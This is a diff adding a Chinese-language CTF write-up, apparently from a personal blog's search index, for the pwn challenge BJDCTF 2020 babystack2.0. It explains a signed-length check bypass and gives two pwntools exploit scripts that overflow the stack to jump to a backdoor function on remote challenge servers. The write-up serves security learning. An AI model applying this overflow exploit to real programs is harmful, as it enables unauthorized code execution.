@@ -93,6 +93,31 @@
     </entry>
     
     
+    
+    <entry>
+      <title>[BJDCTF 2020]babystack2.0</title>
+      <link href="/2023/08/21/BJDCTF2020-babystack2-0/"/>
+      <url>/2023/08/21/BJDCTF2020-babystack2-0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BJDCTF-2020-babystack2-0"><a href="#BJDCTF-2020-babystack2-0" class="headerlink" title="[BJDCTF 2020]babystack2.0"></a>[BJDCTF 2020]babystack2.0</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/./../image/BJDCTF2020-babystack2-0/image_lKMBqZ89D5.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_Z2BfRel13r.png"></p><p>64位程序，开启了栈不可执行（NX）、部分RELRO保护（RELRO）</p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_C2YmsUHVNo.png"></p><p><strong>size_t</strong> 是一些C&#x2F;C++标准在stddef.h中定义的，size_t 类型表示C中任何对象所能达到的最大长度，它是无符号整数。</p><p>它是为了方便系统之间的移植而定义的，不同的系统上，定义size_t 可能不一样。size_t在32位系统上定义为 unsigned int，也就是32位无符号整型。在64位系统上定义为 unsigned long ，也就是64位无符号整形。size_t 的目的是提供一种可移植的方法来声明与系统中可寻址的内存区域一致的长度。</p><p>size_t 在数组下标和内存管理函数之类的地方广泛使用。例如，size_t 用做sizeof 操作符的返回值类型，同时也是很多函数的参数类型，包括malloc 和strlen。</p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_b3OBzZV-mf.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_rTpzYNoN_i.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_OWGoJHJgyL.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_vooqFrCmDG.png"></p><p>这里得到shellcode的地址add&#x3D;0x400726&#x20;</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28156</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;length of your name:&quot;</span>, <span class="string">&quot;2147483649&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28666</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0400726</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../image/BJDCTF2020-babystack2-0/image_fhUAMOdjbo.png"></p><p>备注：一些相关的处理方法链接</p><p><a href="https://blog.csdn.net/yongbaoii/article/details/109105721" title="(10条消息) LibcSearcher 安装 错误处理 与使用_yongbaoii的博客-CSDN博客">(10条消息) LibcSearcher 安装 错误处理 与使用_yongbaoii的博客-CSDN博客</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
   
   
 </search>
